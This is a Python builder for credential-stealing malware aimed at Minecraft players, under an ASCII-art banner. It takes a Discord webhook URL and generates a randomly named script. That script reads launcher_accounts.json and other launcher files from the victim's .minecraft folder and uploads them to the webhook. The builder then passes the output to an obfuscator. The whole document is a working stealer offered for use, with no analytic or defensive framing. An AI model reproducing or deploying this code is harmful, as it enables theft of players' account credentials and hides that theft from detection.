import random
import os
import shutil

random_string = ''

print('░░░░░██╗██╗░░░██╗███╗░░░███╗██████╗░██╗░░░██╗  ███╗░░░███╗░█████╗░')
print('░░░░░██║██║░░░██║████╗░████║██╔══██╗╚██╗░██╔╝  ████╗░████║██╔══██╗')
print('░░░░░██║██║░░░██║██╔████╔██║██████╔╝░╚████╔╝░  ██╔████╔██║██║░░╚═╝')
print('██╗░░██║██║░░░██║██║╚██╔╝██║██╔═══╝░░░╚██╔╝░░  ██║╚██╔╝██║██║░░██╗')
print('╚█████╔╝╚██████╔╝██║░╚═╝░██║██║░░░░░░░░██║░░░  ██║░╚═╝░██║╚█████╔╝')
print('░╚════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░░░░╚═╝░░░  ╚═╝░░░░░╚═╝░╚════╝░')

webhook = input("Webhook to send data to: ")

for _ in range(10):
    random_integer = random.randint(97, 97 + 26 - 1)
    flip_bit = random.randint(0, 1)
    random_integer = random_integer - 32 if flip_bit == 1 else random_integer
    random_string += (chr(random_integer))
with open('builds/'+str(random_string)+'.py', 'w') as f:
    f.write('import os, json\nfrom discord_webhook import DiscordWebhook\nwebhook = DiscordWebhook(url=\''+str(webhook)+'\')\napd = os.getenv(\'APPDATA\')\nmc = apd + \"\\.minecraft\\\\\"\nfiles = [\'launcher_accounts.json\', \'usercache.json\', \'launcher_profiles.json\', \'launcher_log.txt\']\nfor x in files:\n    with open(mc + x, "rb") as f:\n        if (x == \'launcher_accounts.json\'):\n            x = f"USED_TO_LOGIN-{x}"\n        webhook.add_file(file=f.read(), filename=x)\nresponse = webhook.execute()')
os.system('py obf.py builds/'+str(random_string)+'.py')
print('File saved in builds as '+str(random_string)+'.py')